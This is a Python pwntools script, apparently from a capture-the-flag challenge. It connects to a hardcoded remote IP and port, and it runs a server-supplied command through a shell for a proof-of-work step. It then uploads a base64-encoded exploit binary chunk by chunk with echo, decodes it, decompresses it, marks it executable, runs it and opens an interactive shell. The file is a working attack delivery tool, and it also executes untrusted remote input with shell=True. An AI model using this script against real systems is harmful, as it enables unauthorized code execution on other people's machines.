#!/usr/bin/python3
from pwn import *
import sys
import subprocess
#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
#context.log_level = 'debug'

FILE_NAME = "./solver.gz.enc"
HOST = "34.91.20.14"
PORT = 1337 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#off_binsh = next(libc.search(b"/bin/sh"))

def hashcash():
	cmd = conn.recvline()	
	val = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0].strip()
	conn.sendline(val)
	print("[+] hashcode done")


def send_exploit():
	conn.sendlineafter("$", "cd /home/user")
	f = open(FILE_NAME, 'r')
	c = f.read()
	
	print("[+] Send exploit")
	block_size = 0x1000
	for i in range(0, len(c), block_size):
		end = i+block_size if i+block_size < len(c) else len(c)
		s = c[i:end]
		conn.sendlineafter("$", 'echo -n "{}" >> solver.gz.enc'.format(s))
		print("[+] Send {} bytes".format(hex(i)))
	conn.sendlineafter("$", "base64 -d solver.gz.enc > solver.gz")
	conn.sendlineafter("$", "gzip -d ./solver.gz")
	conn.sendlineafter("$", "chmod u+x ./solver")
	conn.sendlineafter("$", "./solver")
	

if __name__ == "__main__":
	hashcash()	
	send_exploit()	
	conn.interactive()	
